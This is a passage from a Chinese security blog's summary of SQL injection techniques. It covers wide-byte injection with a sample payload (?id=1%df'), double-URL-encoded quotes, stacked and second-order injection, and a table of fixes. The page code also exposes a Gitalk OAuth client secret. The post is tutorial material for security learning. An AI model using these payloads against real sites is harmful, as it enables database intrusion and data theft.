+<h2 id="7、宽字节注入（单双引号页面无变化）"><a href="#7、宽字节注入（单双引号页面无变化）" class="headerlink" title="7、宽字节注入（单双引号页面无变化）"></a>7、宽字节注入（单双引号页面无变化）</h2><pre class="highlight"><span class="line">mysql语句执行时，现将数据转成16进制，再执行</span><br><span class="line"></span><br><span class="line">GBK为两字节编码方式，编码范围为8140-FEFE（81为页数，40位行列）</span><br><span class="line"></span><br><span class="line">ascii为单字节编码，编码范围为00-7F（斜杠的ascii码为5C）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">当字节数小于81时，会被认为是ascii编码，将转码成ascii码形式；</span><br><span class="line"></span><br><span class="line">当字节数在81-FE之间时，会被认为是gbk编码，会连同后一位一起以gbk形式编码。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">形如abcd（ab为ascii转码的数据，cd为gbk转码的数据）</span><br><span class="line"></span><br><span class="line">原本应解码成两个ascii数据（a、b）和一个gbk数据（cd）</span><br><span class="line"></span><br><span class="line">但是若b的数据大于81，则会被认为是gbk编码的数据，会和c一起解码，</span><br><span class="line"></span><br><span class="line">此时就解码成了两个ascii数据（a、d）和一个gbk编码数据（bc）</span><br></pre>
+
+<p>利用：构造?id=1%df’即可</p>
+<p>注意：通常出现在斜杠转义单双引号的网页</p>
+<p>%df可以为任何hex码在81-FE之间的数据</p>
+<p>宽字节注入存在条件</p>
+<p>PHP+Mysql+GBK</p>
+<table>
+<thead>
+<tr>
+<th>语句</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>编码语句</td>
+<td>mysql_set_charset(“gbk”)<br>mysql_query(“set names gbk”)</td>
+</tr>
+<tr>
+<td>转义语句</td>
+<td>addslashes(‘’)<br>mysql_real_escape_string(‘’)</td>
+</tr>
+</tbody></table>
+<p>上述四条语句组合中，除了</p>
+<p>mysql_set_charset(“gbk”)+mysql_real_escape_string(‘’)组合，其他组合均存在宽字节注入</p>
+<h2 id="8、二次编码注入-单双引号页面无变化"><a href="#8、二次编码注入-单双引号页面无变化" class="headerlink" title="8、二次编码注入(单双引号页面无变化)"></a>8、二次编码注入(单双引号页面无变化)</h2><table>
+<thead>
+<tr>
+<th>正确流程</th>
+<th>错误流程（二次编码注入）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>php自动进行一次url解码  网站二次解码  转义单双引号进行防护  写入数据库</td>
+<td>php自动解码  转义防护  网站二次解码  urldecode()、rawurldecode()  写入数据库</td>
+</tr>
+</tbody></table>
+<pre class="highlight"><span class="line">单引号二次url编码为：%2527</span><br><span class="line"></span><br><span class="line">双引号二次url编码为：%2522</span><br></pre>
+
+<p>关键字二次编码：hex转码-前缀加%25（%的url编码）</p>
+<p>其他：</p>
+<p>文件上传时，可通过文件名进行sql注入</p>
+<h2 id="9、堆叠注入"><a href="#9、堆叠注入" class="headerlink" title="9、堆叠注入"></a>9、堆叠注入</h2><p>前提：存在sql注入</p>
+<p>截断符后使用分号分割，后面注释，中间插入任意sql语句（多个语句用;分割）。不建议使用update、delect等危险语句！</p>
+<p>堆叠注入存在场景</p>
+<table>
+<thead>
+<tr>
+<th>搭配</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>mssql+asp/php/jsp</td>
+<td>堆叠注入</td>
+</tr>
+<tr>
+<td>mysql+php</td>
+<td></td>
+</tr>
+<tr>
+<td>mysql_connect()/mysql_query(“select  $id”)</td>
+<td>不能堆叠注入</td>
+</tr>
+<tr>
+<td>mysqli_connect()/mysqli_query(“select  $id”)</td>
+<td>不能堆叠注入</td>
+</tr>
+<tr>
+<td>mysqli_connect()/multi_query(“select  $id”)</td>
+<td>堆叠注入</td>
+</tr>
+<tr>
+<td>new  PDO()/bindvalue(“select ?”) execute($id)</td>
+<td>不能注入</td>
+</tr>
+<tr>
+<td>new  PDO()/query(“select $id”)</td>
+<td>堆叠注入</td>
+</tr>
+</tbody></table>
+<h2 id="10、二阶注入"><a href="#10、二阶注入" class="headerlink" title="10、二阶注入"></a>10、二阶注入</h2><p>存储在数据库汇总的数据，在使用时发生的注入</p>
+<p>在注册用户或者发表文章等写入数据库操作时，加入注入语句，被转义存入数据库</p>
+<p>当使用该数据时，被取出，这时注入语句生效</p>
+<p>注意：遇到限制是数字类型或者关键字拦截，可进行十六进制编码</p>
+<h1 id="七、sql注入防护-修复"><a href="#七、sql注入防护-修复" class="headerlink" title="七、sql注入防护/修复"></a>七、sql注入防护/修复</h1><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>去掉单引号</td>
+<td>现实场景常用单引号，去掉不合实际</td>
+</tr>
+<tr>
+<td>转义单引号</td>
+<td>对数字型无效（数字型不需要引号）  斜杠转义  addslashes()函数转义  php.ini配置文件转义（5.6以下版本开启magic_quotes_gpc = On）</td>
+</tr>
+<tr>
+<td>强制类型转换</td>
+<td>针对数字型  intval()</td>
+</tr>
+<tr>
+<td>更改数据库连接方式</td>
+<td>POD连接数据库将变量转换成字符串，再写入数据库，无法拼接</td>
+</tr>
+</tbody></table>
+
+  </div>
+  <div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/article/2cb80240.html" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">Pocsuite3使用 </div>
+          
+        </div>
+      </a>
+    </div>
+  
+  
+    <div class="nav-item-next">
+      <a 
+        href="/article/cfe7a8b3.html" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">下一篇</div>
+          
+            <div class="nav-title">Burpsuite挂梯子抓包 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
+  
+</div>
+
+  <div 
+    class="card card-content comment-card" 
+    style="margin-top: 16px;">
+    <div class="comment-card-title">评论</div>
+    
+  <div id="gitalk-container"></div>
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+  
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+  
+<script src="/js/lib/md5.min.js"></script>
+
+  <script>
+    var gitalk = new Gitalk({
+      clientID: 'e231ce2fa07f8397e8a7',
+      clientSecret: '2fb4635367cf9a78330b811d153435c62a037615',
+      repo: 'zeroChen00.github.io',
+      owner: 'zeroChen00',
+      admin: ["zeroChen00"],
+      id: md5(location.href),
+      distractionFreeMode: true,
+      language: 'zh-CN',
+      labels: ["Gitalk"],
+      perPage: 10
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+  </div>
+
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-text">三、SQL注入利用前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%86%85%E5%90%AB%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-text">四、SQL注入探测与利用（内含思路）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%86%E7%B1%BB"><span class="toc-text">1、分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8E%A2%E6%B5%8B"><span class="toc-text">2、探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-text">五、数据库常用语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%AF%A6%E7%BB%86%E6%96%B9%E6%B3%95"><span class="toc-text">六、详细方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">1、union联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2、报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">4、时间延时盲注（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">5、请求头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5"><span class="toc-text">6、内联注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">7、宽字节注入（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96"><span class="toc-text">8、二次编码注入(单双引号页面无变化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">9、堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">10、二阶注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81sql%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4-%E4%BF%AE%E5%A4%8D"><span class="toc-text">七、sql注入防护&#x2F;修复</span></a></li></ol>
+</div></main>
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="/img/logo.png" 
+    class="author-img" 
+    alt="author avatar">
+
+<p class="author-name">沉墨</p>
+<p class="author-description">努力成为一个Python脚本小子</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>26</span>
+    <span>文章</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>8</span>
+    <span>分类</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>26</span>
+    <span>标签</span>
+  </a>
+</div>
+
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-text">三、SQL注入利用前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%86%85%E5%90%AB%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-text">四、SQL注入探测与利用（内含思路）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%86%E7%B1%BB"><span class="toc-text">1、分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8E%A2%E6%B5%8B"><span class="toc-text">2、探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-text">五、数据库常用语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%AF%A6%E7%BB%86%E6%96%B9%E6%B3%95"><span class="toc-text">六、详细方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">1、union联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2、报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">4、时间延时盲注（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">5、请求头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5"><span class="toc-text">6、内联注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">7、宽字节注入（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96"><span class="toc-text">8、二次编码注入(单双引号页面无变化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">9、堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">10、二阶注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81sql%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4-%E4%BF%AE%E5%A4%8D"><span class="toc-text">七、sql注入防护&#x2F;修复</span></a></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>分类
+  </div>
+  <div class="categories-list">
+    
+      <a href="/categories/%E9%99%84%E5%8A%A0/">
+        <div class="categories-list-item">
+          附加
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <div class="categories-list-item">
+          漏洞复现
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Web%E6%B8%97%E9%80%8F/">
+        <div class="categories-list-item">
+          Web渗透
+          <span class="categories-list-item-badge">5</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+        <div class="categories-list-item">
+          环境搭建
+          <span class="categories-list-item-badge">6</span>
+        </div>
+      </a>
+    
+      <a href="/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/">
+        <div class="categories-list-item">
+          编程基础
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Linux/">
+        <div class="categories-list-item">
+          Linux
+          <span class="categories-list-item-badge">2</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Python/">
+        <div class="categories-list-item">
+          Python
+          <span class="categories-list-item-badge">4</span>
+        </div>
+      </a>
+    
+      <a href="/categories/Windows/">
+        <div class="categories-list-item">
+          Windows
+          <span class="categories-list-item-badge">1</span>
+        </div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>热门标签
+  </div>
+  <div class="tags-list">
+    
+      <a 
+        href="/tags/%E9%9A%8F%E8%AE%B0/" 
+        title="随记">
+        <div class="tags-list-item">随记</div>
+      </a>
+    
+      <a 
+        href="/tags/%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/" 
+        title="直播推流平台">
+        <div class="tags-list-item">直播推流平台</div>
+      </a>
+    
+      <a 
+        href="/tags/Nginx%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" 
+        title="Nginx环境搭建">
+        <div class="tags-list-item">Nginx环境搭建</div>
+      </a>
+    
+      <a 
+        href="/tags/hexo%E5%8D%9A%E5%AE%A2/" 
+        title="hexo博客">
+        <div class="tags-list-item">hexo博客</div>
+      </a>
+    
+      <a 
+        href="/tags/LAMP/" 
+        title="LAMP">
+        <div class="tags-list-item">LAMP</div>
+      </a>
+    
+      <a 
+        href="/tags/%E5%8F%8D%E5%BC%B9shell/" 
+        title="反弹shell">
+        <div class="tags-list-item">反弹shell</div>
+      </a>
+    
+      <a 
+        href="/tags/DVWA/" 
+        title="DVWA">
+        <div class="tags-list-item">DVWA</div>
+      </a>
+    
+      <a 
+        href="/tags/%E6%8F%90%E6%9D%83/" 
+        title="提权">
+        <div class="tags-list-item">提权</div>
+      </a>
+    
+      <a 
+        href="/tags/IIS/" 
+        title="IIS">
+        <div class="tags-list-item">IIS</div>
+      </a>
+    
+      <a 
+        href="/tags/Java%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" 
+        title="Java环境配置">
+        <div class="tags-list-item">Java环境配置</div>
+      </a>
+    
+      <a 
+        href="/tags/Vulhub/" 
+        title="Vulhub">
+        <div class="tags-list-item">Vulhub</div>
+      </a>
+    
+      <a 
+        href="/tags/Python3/" 
+        title="Python3">
+        <div class="tags-list-item">Python3</div>
+      </a>
+    
+      <a 
+        href="/tags/SQL%E6%B3%A8%E5%85%A5/" 
+        title="SQL注入">
+        <div class="tags-list-item">SQL注入</div>
+      </a>
+    
+      <a 
+        href="/tags/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" 
+        title="Redis未授权访问">
+        <div class="tags-list-item">Redis未授权访问</div>
+      </a>
+    
+      <a 
+        href="/tags/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97/" 
+        title="Shiro反序列">
+        <div class="tags-list-item">Shiro反序列</div>
+      </a>
+    
+      <a 
+        href="/tags/portscan/" 
+        title="portscan">
+        <div class="tags-list-item">portscan</div>
+      </a>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-text">二、SQL注入产生原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81SQL%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E5%89%8D%E6%8F%90"><span class="toc-text">三、SQL注入利用前提</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E6%B5%8B%E4%B8%8E%E5%88%A9%E7%94%A8%EF%BC%88%E5%86%85%E5%90%AB%E6%80%9D%E8%B7%AF%EF%BC%89"><span class="toc-text">四、SQL注入探测与利用（内含思路）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E5%88%86%E7%B1%BB"><span class="toc-text">1、分类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8E%A2%E6%B5%8B"><span class="toc-text">2、探测</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E6%95%B0%E6%8D%AE%E5%BA%93%E5%B8%B8%E7%94%A8%E8%AF%AD%E5%8F%A5"><span class="toc-text">五、数据库常用语句</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E8%AF%A6%E7%BB%86%E6%96%B9%E6%B3%95"><span class="toc-text">六、详细方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81union%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">1、union联合查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2、报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E3%80%81%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3、布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E3%80%81%E6%97%B6%E9%97%B4%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">4、时间延时盲注（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E3%80%81%E8%AF%B7%E6%B1%82%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-text">5、请求头注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#6%E3%80%81%E5%86%85%E8%81%94%E6%B3%A8%E5%85%A5"><span class="toc-text">6、内联注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7%E3%80%81%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%EF%BC%88%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96%EF%BC%89"><span class="toc-text">7、宽字节注入（单双引号页面无变化）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8%E3%80%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%B3%A8%E5%85%A5-%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E9%A1%B5%E9%9D%A2%E6%97%A0%E5%8F%98%E5%8C%96"><span class="toc-text">8、二次编码注入(单双引号页面无变化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9%E3%80%81%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">9、堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#10%E3%80%81%E4%BA%8C%E9%98%B6%E6%B3%A8%E5%85%A5"><span class="toc-text">10、二阶注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83%E3%80%81sql%E6%B3%A8%E5%85%A5%E9%98%B2%E6%8A%A4-%E4%BF%AE%E5%A4%8D"><span class="toc-text">七、sql注入防护&#x2F;修复</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-19</div>
+        <a href="/article/6c8e015a.html"><div class="recent-posts-item-content">Pocsuite3重写redis脚本</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-19</div>
+        <a href="/article/2cb80240.html"><div class="recent-posts-item-content">Pocsuite3使用</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-09</div>
+        <a href="/article/30e59cf7.html"><div class="recent-posts-item-content">SQL注入方法总结</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-07-09</div>
+        <a href="/article/cfe7a8b3.html"><div class="recent-posts-item-content">Burpsuite挂梯子抓包</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
